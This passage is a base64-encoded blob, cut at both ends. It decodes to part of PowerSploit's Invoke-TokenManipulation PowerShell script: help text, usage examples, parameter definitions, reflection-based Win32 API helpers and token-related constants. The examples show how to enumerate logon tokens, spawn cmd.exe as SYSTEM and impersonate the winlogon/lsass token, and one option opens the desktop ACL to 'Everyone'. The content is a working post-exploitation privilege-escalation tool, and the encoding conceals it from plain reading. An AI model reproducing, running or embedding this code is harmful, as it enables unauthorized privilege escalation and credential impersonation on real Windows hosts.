vIGNyZWRlbnRpYWxzIGFzc29jaWF0ZWQgd2l0aCB0aGUgdG9rZW4sIGl0IHdpbGwgbm90IGJlIHBvc3NpYmxlIHRvIGF1dGhlbnRpY2F0ZSBvZmYtYm94IHdpdGggdGhlIHRva2VuLiBBbGwgb3RoZXIgbG9nb24gdHlwZXMKc2hvdWxkIGhhdmUgY3JlZGVudGlhbHMgYXNzb2NpYXRlZCB3aXRoIHRoZW0gKHN1Y2ggYXMgSW50ZXJhY3RpdmUgbG9nb24sIFNlcnZpY2UgbG9nb24sIFJlbW90ZSBpbnRlcmFjdGl2ZSBsb2dvbiwgZXRjKS4gVGhlcmVmb3JlLCB0aGlzIHNjcmlwdCBsb29rcwpmb3IgdG9rZW5zIHdoaWNoIHdlcmUgY3JlYXRlZCB3aXRoIGRlc2lyYWJsZSBsb2dvbiB0b2tlbnMgKGFuZCBvbmx5IGRpc3BsYXlzIHRoZW0gYnkgZGVmYXVsdCkuCgpJbiBhIG51dHNoZWxsLCBpbnN0ZWFkIG9mIHdvcnJ5aW5nIGFib3V0ICJkZWxlZ2F0aW9uIHZzIGltcGVyc29uYXRpb24iIHRva2VucywgeW91IHNob3VsZCB3b3JyeSBhYm91dCBOZXR3b3JrTG9nb24gKGJhZCkgdnMgTm9uLU5ldHdvcmtMb2dvbiAoZ29vZCkuCgoKUG93ZXJTcGxvaXQgRnVuY3Rpb246IEludm9rZS1Ub2tlbk1hbmlwdWxhdGlvbgpBdXRob3I6IEpvZSBCaWFsZWssIFR3aXR0ZXI6IEBKb3NlcGhCaWFsZWsKTGljZW5zZTogQlNEIDMtQ2xhdXNlClJlcXVpcmVkIERlcGVuZGVuY2llczogTm9uZQpPcHRpb25hbCBEZXBlbmRlbmNpZXM6IE5vbmUKVmVyc2lvbjogMS4xMQooMS4xIC0+IDEuMTE6IFBhc3NUaHJ1IG9mIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIG9iamVjdCBhZGRlZCBieSBSdW5lIE1hcmlib2UsIGh0dHBzOi8vd3d3LmxpbmtlZGluLmNvbS9pbi9ydW5lbWFyaWJvZSkKCi5ERVNDUklQVElPTgoKTGlzdHMgYXZhaWxhYmxlIGxvZ29uIHRva2Vucy4gQ3JlYXRlcyBwcm9jZXNzZXMgd2l0aCBvdGhlciB1c2VycyBsb2dvbiB0b2tlbnMsIGFuZCBpbXBlcnNvbmF0ZXMgbG9nb24gdG9rZW5zIGluIHRoZSBjdXJyZW50IHRocmVhZC4KCi5QQVJBTUVURVIgRW51bWVyYXRlCgpTd2l0Y2guIFNwZWNpZmljcyB0byBlbnVtZXJhdGUgbG9nb24gdG9rZW5zIGF2YWlsYWJsZS4gQnkgZGVmYXVsdCB0aGlzIHdpbGwgb25seSBsaXN0IHVucWl1ZSB1c2FibGUgdG9rZW5zIChub3QgbmV0d29yay1sb2dvbiB0b2tlbnMpLgoKLlBBUkFNRVRFUiBSZXZUb1NlbGYKClN3aXRjaC4gU3RvcHMgaW1wZXJzb25hdGluZyBhbiBhbHRlcm5hdGUgdXNlcnMgVG9rZW4uCgouUEFSQU1FVEVSIFNob3dBbGwKClN3aXRjaC4gRW51bWVyYXRlIGFsbCBMb2dvbiBUb2tlbnMgKGluY2x1ZGluZyBub24tdW5pcXVlIHRva2VucyBhbmQgTmV0d29ya0xvZ29uIHRva2VucykuCgouUEFSQU1FVEVSIEltcGVyc29uYXRlVXNlcgoKU3dpdGNoLiBXaWxsIGltcGVyc29uYXRlIGFuIGFsdGVybmF0ZSB1c2VycyBsb2dvbiB0b2tlbiBpbiB0aGUgUG93ZXJTaGVsbCB0aHJlYWQuIENhbiBzcGVjaWZ5IHRoZSB0b2tlbiB0byB1c2UgYnkgVXNlcm5hbWUsIFByb2Nlc3NJZCwgb3IgVGhyZWFkSWQuCiAgICBUaGlzIG1vZGUgaXMgbm90IHJlY29tbWVuZGVkIGJlY2F1c2UgUG93ZXJTaGVsbCBpcyBoZWF2aWx5IHRocmVhZGVkIGFuZCBtYW55IGFjdGlvbnMgd29uJ3QgYmUgZG9uZSBpbiB0aGUgY3VycmVudCB0aHJlYWQuIFVzZSBDcmVhdGVQcm9jZXNzIGluc3RlYWQuCgkKLlBBUkFNRVRFUiBDcmVhdGVQcm9jZXNzCgpTcGVjaWZ5IGEgcHJvY2VzcyB0byBjcmVhdGUgd2l0aCBhbiBhbHRlcm5hdGUgdXNlcnMgbG9nb24gdG9rZW4uIENhbiBzcGVjaWZ5IHRoZSB0b2tlbiB0byB1c2UgYnkgVXNlcm5hbWUsIFByb2Nlc3NJZCwgb3IgVGhyZWFkSWQuCgkKLlBBUkFNRVRFUiBXaG9BbUkKClN3aXRjaC4gRGlzcGxheXMgdGhlIGNyZWRlbnRpYWxzIHRoZSBQb3dlclNoZWxsIHRocmVhZCBpcyBydW5uaW5nIHVuZGVyLgoKLlBBUkFNRVRFUiBVc2VybmFtZQoKU3BlY2lmeSB0aGUgVG9rZW4gdG8gdXNlIGJ5IHVzZXJuYW1lLiBUaGlzIHdpbGwgY2hvb3NlIGEgbm9uLU5ldHdvcmtMb2dvbiB0b2tlbiBiZWxvbmdpbmcgdG8gdGhlIHVzZXIuCgouUEFSQU1FVEVSIFByb2Nlc3NJZAoKU3BlY2lmeSB0aGUgVG9rZW4gdG8gdXNlIGJ5IFByb2Nlc3NJZC4gVGhpcyB3aWxsIHVzZSB0aGUgcHJpbWFyeSB0b2tlbiBvZiB0aGUgcHJvY2VzcyBzcGVjaWZpZWQuCgouUEFSQU1FVEVSIFByb2Nlc3MKClNwZWNpZnkgdGhlIHRva2VuIHRvIHVzZSBieSBwcm9jZXNzIG9iamVjdCAod2lsbCB1c2UgdGhlIHByb2Nlc3NJZCB1bmRlciB0aGUgY292ZXJzKS4gVGhpcyB3aWxsIGltcGVyc29uYXRlIHRoZSBwcmltYXJ5IHRva2VuIG9mIHRoZSBwcm9jZXNzLgoKLlBBUkFNRVRFUiBUaHJlYWRJZAoKU3BlY2lmeSB0aGUgVG9rZW4gdG8gdXNlIGJ5IFRocmVhZElkLiBUaGlzIHdpbGwgdXNlIHRoZSB0b2tlbiBvZiB0aGUgdGhyZWFkIHNwZWNpZmllZC4KCi5QQVJBTUVURVIgUHJvY2Vzc0FyZ3MKClNwZWNpZnkgdGhlIGFyZ3VtZW50cyB0byBzdGFydCB0aGUgc3BlY2lmaWVkIHByb2Nlc3Mgd2l0aCB3aGVuIHVzaW5nIHRoZSAtQ3JlYXRlUHJvY2VzcyBtb2RlLgoKLlBBUkFNRVRFUiBOb1VJCgpJZiB5b3UgYXJlIGNyZWF0aW5nIGEgcHJvY2VzcyB3aGljaCBkb2Vzbid0IG5lZWQgYSBVSSB0byBiZSByZW5kZXJlZCwgdXNlIHRoaXMgZmxhZy4gVGhpcyB3aWxsIHByZXZlbnQgdGhlIHNjcmlwdCBmcm9tIG1vZGlmeWluZyB0aGUgRGVza3RvcCBBQ0wncyBvZiB0aGUgCmN1cnJlbnQgdXNlci4gSWYgdGhpcyBmbGFnIGlzbid0IHNldCBhbmQgLUNyZWF0ZVByb2Nlc3MgaXMgdXNlZCwgdGhpcyBzY3JpcHQgd2lsbCBtb2RpZnkgdGhlIEFDTCdzIG9mIHRoZSBjdXJyZW50IHVzZXJzIGRlc2t0b3AgdG8gYWxsb3cgZnVsbCBjb250cm9sCnRvICJFdmVyeW9uZSIuCgouUEFSQU1FVEVSIFBhc3NUaHJ1CgpJZiB5b3UgYXJlIGNyZWF0aW5nIGEgcHJvY2VzcywgdGhpcyB3aWxsIHBhc3MgdGhlIFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzIG9iamVjdCB0byB0aGUgcGlwZWxpbmUuCgoJCi5FWEFNUExFCgpJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24gLUVudW1lcmF0ZQoKTGlzdHMgYWxsIHVuaXF1ZSB1c2FibGUgdG9rZW5zIG9uIHRoZSBjb21wdXRlci4KCi5FWEFNUExFCgpJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24gLUNyZWF0ZVByb2Nlc3MgImNtZC5leGUiIC1Vc2VybmFtZSAibnQgYXV0aG9yaXR5XHN5c3RlbSIKClNwYXducyBjbWQuZXhlIGFzIFNZU1RFTS4KCi5FWEFNUExFCgpJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24gLUltcGVyc29uYXRlVXNlciAtVXNlcm5hbWUgIm50IGF1dGhvcml0eVxzeXN0ZW0iCgpNYWtlcyB0aGUgY3VycmVudCBQb3dlclNoZWxsIHRocmVhZCBpbXBlcnNvbmF0ZSBTWVNURU0uCgouRVhBTVBMRQoKSW52b2tlLVRva2VuTWFuaXB1bGF0aW9uIC1DcmVhdGVQcm9jZXNzICJjbWQuZXhlIiAtUHJvY2Vzc0lkIDUwMAoKU3Bhd25zIGNtZC5leGUgdXNpbmcgdGhlIHByaW1hcnkgdG9rZW4gYmVsb25naW5nIHRvIHByb2Nlc3MgSUQgNTAwLgoKLkVYQU1QTEUKCkludm9rZS1Ub2tlbk1hbmlwdWxhdGlvbiAtU2hvd0FsbAoKTGlzdHMgYWxsIHRva2VucyBhdmFpbGFibGUgb24gdGhlIGNvbXB1dGVyLCBpbmNsdWRpbmcgbm9uLXVuaXF1ZSB0b2tlbnMgYW5kIHRva2VucyBjcmVhdGVkIHVzaW5nIE5ldHdvcmtMb2dvbi4KCi5FWEFNUExFCgpJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24gLUNyZWF0ZVByb2Nlc3MgImNtZC5leGUiIC1UaHJlYWRJZCA1MDAKClNwYXducyBjbWQuZXhlIHVzaW5nIHRoZSB0b2tlbiBiZWxvbmdpbmcgdG8gdGhyZWFkIElEIDUwMC4KCi5FWEFNUExFCgpHZXQtUHJvY2VzcyB3aW5pbml0IHwgSW52b2tlLVRva2VuTWFuaXB1bGF0aW9uIC1DcmVhdGVQcm9jZXNzICJjbWQuZXhlIgoKU3Bhd25zIGNtZC5leGUgdXNpbmcgdGhlIHByaW1hcnkgdG9rZW4gb2YgTFNBU1MuZXhlLiBUaGlzIHBpcGVzIHRoZSBvdXRwdXQgb2YgR2V0LVByb2Nlc3MgdG8gdGhlICItUHJvY2VzcyIgcGFyYW1ldGVyIG9mIHRoZSBzY3JpcHQuCgouRVhBTVBMRQoKKEdldC1Qcm9jZXNzIHdpbmluaXQgfCBJbnZva2UtVG9rZW5NYW5pcHVsYXRpb24gLUNyZWF0ZVByb2Nlc3MgImNtZC5leGUiIC1QYXNzVGhydSkuV2FpdEZvckV4aXQoKQoKU3Bhd25zIGNtZC5leGUgdXNpbmcgdGhlIHByaW1hcnkgdG9rZW4gb2YgTFNBU1MuZXhlLiBUaGVuIGhvbGRzIHRoZSBzcGF3bmluZyBQb3dlclNoZWxsIHNlc3Npb24gdW50aWwgdGhhdCBwcm9jZXNzIGhhcyBleGl0ZWQuCgouRVhBTVBMRQoKR2V0LVByb2Nlc3Mgd2luaW5pdCB8IEludm9rZS1Ub2tlbk1hbmlwdWxhdGlvbiAtSW1wZXJzb25hdGVVc2VyCgpNYWtlcyB0aGUgY3VycmVudCB0aHJlYWQgaW1wZXJzb25hdGUgdGhlIGxzYXNzIHNlY3VyaXR5IHRva2VuLgoKLk5PVEVTClRoaXMgc2NyaXB0IHdhcyBpbnNwaXJlZCBieSBpbmNvZ25pdG8uIAoKU2V2ZXJhbCBvZiB0aGUgZnVuY3Rpb25zIHVzZWQgaW4gdGhpcyBzY3JpcHQgd2VyZSB3cml0dGVuIGJ5IE1hdHQgR3JhZWJlcihUd2l0dGVyOiBAbWF0dGlmZXN0YXRpb24sIEJsb2c6IGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLykuCkJJRyBUSEFOS1MgdG8gTWF0dCBHcmFlYmVyIGZvciBoZWxwaW5nIGRlYnVnLgoKLkxJTksKCkJsb2c6IGh0dHA6Ly9jbHltYjNyLndvcmRwcmVzcy5jb20vCkdpdGh1YiByZXBvOiBodHRwczovL2dpdGh1Yi5jb20vY2x5bWIzci9Qb3dlclNoZWxsCkJsb2cgb24gdGhpcyBzY3JpcHQ6IGh0dHA6Ly9jbHltYjNyLndvcmRwcmVzcy5jb20vMjAxMy8xMS8wMy9wb3dlcnNoZWxsLWFuZC10b2tlbi1pbXBlcnNvbmF0aW9uLwoKIz4KCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZT0iRW51bWVyYXRlIildCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiRW51bWVyYXRlIildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRW51bWVyYXRlLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiUmV2VG9TZWxmIildCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkUmV2VG9TZWxmLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiU2hvd0FsbCIpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFNob3dBbGwsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJJbXBlcnNvbmF0ZVVzZXIiKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICRJbXBlcnNvbmF0ZVVzZXIsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJDcmVhdGVQcm9jZXNzIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ3JlYXRlUHJvY2VzcywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gIldob0FtSSIpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFdob0FtSSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gIkltcGVyc29uYXRlVXNlciIpXQogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJDcmVhdGVQcm9jZXNzIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkVXNlcm5hbWUsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJJbXBlcnNvbmF0ZVVzZXIiKV0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiQ3JlYXRlUHJvY2VzcyIpXQogICAgICAgIFtJbnRdCiAgICAgICAgJFByb2Nlc3NJZCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gIkltcGVyc29uYXRlVXNlciIsIFZhbHVlRnJvbVBpcGVsaW5lPSR0cnVlKV0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiQ3JlYXRlUHJvY2VzcyIsIFZhbHVlRnJvbVBpcGVsaW5lPSR0cnVlKV0KICAgICAgICBbU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3NdCiAgICAgICAgJFByb2Nlc3MsCgogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICJJbXBlcnNvbmF0ZVVzZXIiKV0KICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiQ3JlYXRlUHJvY2VzcyIpXQogICAgICAgICRUaHJlYWRJZCwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gIkNyZWF0ZVByb2Nlc3MiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRQcm9jZXNzQXJncywKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gIkNyZWF0ZVByb2Nlc3MiKV0KICAgICAgICBbU3dpdGNoXQogICAgICAgICROb1VJLAoKICAgICAgICBbUGFyYW1ldGVyKFBhcmFtZXRlclNldE5hbWUgPSAiQ3JlYXRlUHJvY2VzcyIpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFBhc3NUaHJ1CiAgICApCiAgIAogICAgU2V0LVN0cmljdE1vZGUgLVZlcnNpb24gMgoKCSNGdW5jdGlvbiB3cml0dGVuIGJ5IE1hdHQgR3JhZWJlciwgVHdpdHRlcjogQG1hdHRpZmVzdGF0aW9uLCBCbG9nOiBodHRwOi8vd3d3LmV4cGxvaXQtbW9uZGF5LmNvbS8KCUZ1bmN0aW9uIEdldC1EZWxlZ2F0ZVR5cGUKCXsKCSAgICBQYXJhbQoJICAgICgKCSAgICAgICAgW091dHB1dFR5cGUoW1R5cGVdKV0KCSAgICAgICAgCgkgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMCldCgkgICAgICAgIFtUeXBlW11dCgkgICAgICAgICRQYXJhbWV0ZXJzID0gKE5ldy1PYmplY3QgVHlwZVtdKDApKSwKCSAgICAgICAgCgkgICAgICAgIFtQYXJhbWV0ZXIoIFBvc2l0aW9uID0gMSApXQoJICAgICAgICBbVHlwZV0KCSAgICAgICAgJFJldHVyblR5cGUgPSBbVm9pZF0KCSAgICApCgoJICAgICREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgoJICAgICREeW5Bc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdSZWZsZWN0ZWREZWxlZ2F0ZScpCgkgICAgJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5Bc3NlbWJseSwgW1N5c3RlbS5SZWZsZWN0aW9uLkVtaXQuQXNzZW1ibHlCdWlsZGVyQWNjZXNzXTo6UnVuKQoJICAgICRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdJbk1lbW9yeU1vZHVsZScsICRmYWxzZSkKCSAgICAkVHlwZUJ1aWxkZXIgPSAkTW9kdWxlQnVpbGRlci5EZWZpbmVUeXBlKCdNeURlbGVnYXRlVHlwZScsICdDbGFzcywgUHVibGljLCBTZWFsZWQsIEFuc2lDbGFzcywgQXV0b0NsYXNzJywgW1N5c3RlbS5NdWx0aWNhc3REZWxlZ2F0ZV0pCgkgICAgJENvbnN0cnVjdG9yQnVpbGRlciA9ICRUeXBlQnVpbGRlci5EZWZpbmVDb25zdHJ1Y3RvcignUlRTcGVjaWFsTmFtZSwgSGlkZUJ5U2lnLCBQdWJsaWMnLCBbU3lzdGVtLlJlZmxlY3Rpb24uQ2FsbGluZ0NvbnZlbnRpb25zXTo6U3RhbmRhcmQsICRQYXJhbWV0ZXJzKQoJICAgICRDb25zdHJ1Y3RvckJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCgkgICAgJE1ldGhvZEJ1aWxkZXIgPSAkVHlwZUJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdJbnZva2UnLCAnUHVibGljLCBIaWRlQnlTaWcsIE5ld1Nsb3QsIFZpcnR1YWwnLCAkUmV0dXJuVHlwZSwgJFBhcmFtZXRlcnMpCgkgICAgJE1ldGhvZEJ1aWxkZXIuU2V0SW1wbGVtZW50YXRpb25GbGFncygnUnVudGltZSwgTWFuYWdlZCcpCgkgICAgCgkgICAgV3JpdGUtT3V0cHV0ICRUeXBlQnVpbGRlci5DcmVhdGVUeXBlKCkKCX0KCgoJI0Z1bmN0aW9uIHdyaXR0ZW4gYnkgTWF0dCBHcmFlYmVyLCBUd2l0dGVyOiBAbWF0dGlmZXN0YXRpb24sIEJsb2c6IGh0dHA6Ly93d3cuZXhwbG9pdC1tb25kYXkuY29tLwoJRnVuY3Rpb24gR2V0LVByb2NBZGRyZXNzCgl7CgkgICAgUGFyYW0KCSAgICAoCgkgICAgICAgIFtPdXRwdXRUeXBlKFtJbnRQdHJdKV0KCSAgICAKCSAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQoJICAgICAgICBbU3RyaW5nXQoJICAgICAgICAkTW9kdWxlLAoJICAgICAgICAKCSAgICAgICAgW1BhcmFtZXRlciggUG9zaXRpb24gPSAxLCBNYW5kYXRvcnkgPSAkVHJ1ZSApXQoJICAgICAgICBbU3RyaW5nXQoJICAgICAgICAkUHJvY2VkdXJlCgkgICAgKQoKCSAgICAjIEdldCBhIHJlZmVyZW5jZSB0byBTeXN0ZW0uZGxsIGluIHRoZSBHQUMKCSAgICAkU3lzdGVtQXNzZW1ibHkgPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbi5HZXRBc3NlbWJsaWVzKCkgfAoJICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5HbG9iYWxBc3NlbWJseUNhY2hlIC1BbmQgJF8uTG9jYXRpb24uU3BsaXQoJ1xcJylbLTFdLkVxdWFscygnU3lzdGVtLmRsbCcpIH0KCSAgICAkVW5zYWZlTmF0aXZlTWV0aG9kcyA9ICRTeXN0ZW1Bc3NlbWJseS5HZXRUeXBlKCdNaWNyb3NvZnQuV2luMzIuVW5zYWZlTmF0aXZlTWV0aG9kcycpCgkgICAgIyBHZXQgYSByZWZlcmVuY2UgdG8gdGhlIEdldE1vZHVsZUhhbmRsZSBhbmQgR2V0UHJvY0FkZHJlc3MgbWV0aG9kcwoJICAgICRHZXRNb2R1bGVIYW5kbGUgPSAkVW5zYWZlTmF0aXZlTWV0aG9kcy5HZXRNZXRob2QoJ0dldE1vZHVsZUhhbmRsZScpCgkgICAgJEdldFByb2NBZGRyZXNzID0gJFVuc2FmZU5hdGl2ZU1ldGhvZHMuR2V0TWV0aG9kKCdHZXRQcm9jQWRkcmVzcycpCgkgICAgIyBHZXQgYSBoYW5kbGUgdG8gdGhlIG1vZHVsZSBzcGVjaWZpZWQKCSAgICAkS2VybjMySGFuZGxlID0gJEdldE1vZHVsZUhhbmRsZS5JbnZva2UoJG51bGwsIEAoJE1vZHVsZSkpCgkgICAgJHRtcFB0ciA9IE5ldy1PYmplY3QgSW50UHRyCgkgICAgJEhhbmRsZVJlZiA9IE5ldy1PYmplY3QgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZigkdG1wUHRyLCAkS2VybjMySGFuZGxlKQoKCSAgICAjIFJldHVybiB0aGUgYWRkcmVzcyBvZiB0aGUgZnVuY3Rpb24KCSAgICBXcml0ZS1PdXRwdXQgJEdldFByb2NBZGRyZXNzLkludm9rZSgkbnVsbCwgQChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLkhhbmRsZVJlZl0kSGFuZGxlUmVmLCAkUHJvY2VkdXJlKSkKCX0KCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAjV2luMzJDb25zdGFudHMKICAgICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKICAgICRDb25zdGFudHMgPSBAewogICAgICAgIEFDQ0VTU19TWVNURU1fU0VDVVJJVFkgPSAweDAxMDAwMDAwCiAgICAgICAgUkVBRF9DT05UUk9MID0gMHgwMDAyMDAwMAogICAgICAgIFNZTkNIUk9OSVpFID0gMHgwMDEwMDAwMAogICAgICAgIFNUQU5EQVJEX1JJR0hUU19BTEwgPSAweDAwMUYwMDAwCiAgICAgICAgVE9LRU5fUVVFUlkgPSA4CiAgICAgICAgVE9LRU5fQURKVVNUX1BSSVZJTEVHRVMgPSAweDIwCiAgICAgICAgRVJST1JfTk9fVE9LRU4gPSAweDNmMAogICAgICAgIFNFQ1VSSVRZX0RFTEVHQVRJT04gPSAzCiAgICAgICAgREFDTF9TRUNVUklUWV9JTkZPUk1BVElPTiA9IDB4NAogICAgICAgIEFDQ0VTU19BTExPV0VEX0FDRV9UWVBFID0gMHgwCiAgICAgICAgU1RBTkRBUkRfUklHSFRTX1JFUVVJUkVEID0gMHgwMDBGMDAwMAogICAgICAgIERFU0tUT1BfR0VORVJJQ19BTEwgPSAweDAwMEYwMUZGCiAgICAgICAgV1JJVEVfREFDID0gMHgwMDA0MDAwMAogICAgICAgIE9CSkVDVF9JTkhFUklUX0FDRSA9IDB4MQogICAgICAgIEdSQU5UX0FDQ0VTUyA9IDB4MQogICAgICAgIFRSVVNURUVfSVNfTkFNRSA9IDB4MQogICAgICAgIFRSVVNURUVfSVNfU0lEID0gMHgwCiAgICAgICAgVFJVU1RFRV9JU19VU0VSID0gMHgxCiAgICAgICAgVFJVU1RFRV9JU19XRUxMX0tOT1dOX0dST1VQID0gMHg1CiAgICAgICAgVFJVU1RFRV9JU19HUk9VUCA9IDB4MgogICAgICAgIFBST0NFU1NfUVVFUllfSU5GT1JNQVRJT04gPSAweDQwMAogICAgICAgIFRPS0VOX0FTU0lHTl9QUklNQVJZID0gMHgxCiAgICAgICAgVE9LRU5fRFVQTElDQVRFID0gMHgyCiAgICAgICAgVE9LRU5fSU1QRVJTT05BVEUgPSAweDQKICAgICAgICBUT0tFTl9RVUVSWV9TT1VSQ0UgPSAweDEwCiAgICAgICAgU1RBTkRBUkRfUklHSFRTX1JFQUQgPSAweDIwMDAwCiAgICAgICAgVG9rZW5TdGF0aXN0aWNzID0gMTAKICAgICAgICBUT0tFTl9BTExfQUNDRVNTID0gMHhmMDFmZgogICAgICAgIE1BWElNVU1fQUxMT1dFRCA9IDB4MDIwMDAwMDAKICAgICAgICBUSFJFQURfQUxMX0FDQ0VTUyA9IDB4MWYwM2ZmCiAgICAgICAgRVJST1JfSU5WQUxJRF9QQVJBTUVURVIgPSAweDU3CiAgICAgICAgTE9HT05fTkVUQ1JFREVOVElBTFNfT05MWSA9IDB4MgogICAgICAgIFNFX1BSSVZJTEVHRV9FTkFCTEVEID0gMHgyCiAgICAgICAgU0VfUFJJVklMRUdFX0VOQUJMRURfQllfREVGQVVMVCA9IDB4MQogICAgICAgIFNFX1BSSVZJTEVHRV9SRU1PVkVEID0gMHg0CiAgICB9CgogICAgJFdpbjMyQ29uc3RhbnRzID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgJENvbnN0YW50cwogICAgIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiAgICAjV2luMzJTdHJ1Y3R1cmVzCiAgICAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCgkjRGVmaW5lIGFsbCB0aGUgc3RydWN0dXJlcy9lbnVtcyB0aGF0IHdpbGwgYmUgdXNlZAoJIwlUaGlzIGFydGljbGUgc2hvd3MgeW91IGhvdyB0byBkbyB0aGlzIHdpdGggcmVmbGVjdGlvbjogaHR0cDovL3d3dy5leHBsb2l0LW1vbmRheS5jb20vMjAxMi8wNy9zdHJ1Y3RzLWFuZC1lbnVtcy11c2luZy1yZWZsZWN0aW9uLmh0bWwKCSREb21haW4gPSBbQXBwRG9tYWluXTo6Q3VycmVudERvbWFpbgoJJER5bmFtaWNBc3NlbWJseSA9IE5ldy1PYmplY3QgU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHlOYW1lKCdEeW5hbWljQXNzZW1ibHknKQoJJEFzc2VtYmx5QnVpbGRlciA9ICREb21haW4uRGVmaW5lRHluYW1pY0Fzc2VtYmx5KCREeW5hbWljQXNzZW1ibHksIFtTeXN0ZW0uUmVmbGVjdGlvbi5FbWl0LkFzc2VtYmx5QnVpbGRlckFjY2Vzc106OlJ1bikKCSRNb2R1bGVCdWlsZGVyID0gJEFzc2VtYmx5QnVpbGRlci5EZWZpbmVEeW5hbWljTW9kdWxlKCdEeW5hbWljTW9kdWxlJywgJGZhbHNlKQoJJENvbnN0cnVjdG9ySW5mbyA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbEFzQXR0cmlidXRlXS5HZXRDb25zdHJ1Y3RvcnMoKVswXQoKICAgICNFTlVNcwoJJFR5cGVCdWlsZGVyID0gJE1vZHVsZUJ1aWxkZXIuRGVmaW5lRW51bSgnVE9LRU5fSU5GT1JNQVRJT05fQ0xBU1MnLCAnUHVibGljJywgW1VJbnQzMl0pCgkkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5Vc2VyJywgW1VJbnQzMl0gMSkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuR3JvdXBzJywgW1VJbnQzMl0gMikgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuUHJpdmlsZWdlcycsIFtVSW50MzJdIDMpIHwgT3V0LU51bGwKICAgICRUeXBlQnVpbGRlci5EZWZpbmVMaXRlcmFsKCdUb2tlbk93bmVyJywgW1VJbnQzMl0gNCkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuUHJpbWFyeUdyb3VwJywgW1VJbnQzMl0gNSkgfCBPdXQtTnVsbAogICAgJFR5cGVCdWlsZGVyLkRlZmluZUxpdGVyYWwoJ1Rva2VuRGVmYXVsdERhY2wnLCBbVUludDMyXSA2KSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgnVG9rZW5Tb3VyY2UnLCBbVUludDMyXSA3KSB8IE91dC1OdWxsCiAgICAkVHlwZUJ1aWxkZXIuRGVmaW5lTGl0ZXJhbCgn